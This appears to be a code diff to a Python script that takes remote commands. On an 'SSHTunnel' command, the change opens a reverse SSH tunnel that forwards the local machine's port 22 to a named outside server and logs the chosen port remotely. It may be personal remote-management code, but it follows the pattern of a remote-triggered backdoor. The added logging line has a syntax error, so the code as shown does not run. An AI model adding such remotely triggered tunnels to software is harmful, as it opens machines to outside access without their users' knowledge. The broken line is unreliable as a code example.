@@ -62,10 +62,11 @@ def runtime():
                 if 'SSHTunnel' in cmd_split[0]:
                     if int(cmd_split[1]) == 1:
                         if ssh_pid == 0 :
-                            proc = subprocess.Popen("cat", shell=True, preexec_fn=os.setsid)
+                            port = random.randint(9000,9997)
+                            proc = subprocess.Popen("ssh -i ~/.ssh/server -N -R "+str(port)+":localhost:22 arif193_gcc@ahmed-arif.com", shell=True, preexec_fn=os.setsid)
                             print('ok')
                             ssh_pid = proc.pid
-                            remote_log("starting Remote SSH Service .. on pid" + str(ssh_pid))
+                            remote_log("starting Remote SSH Service .. on pid : " + str(ssh_pid) + "and port : " str(port) )
                         else:
                             remote_log("already running")
                             print("already running")
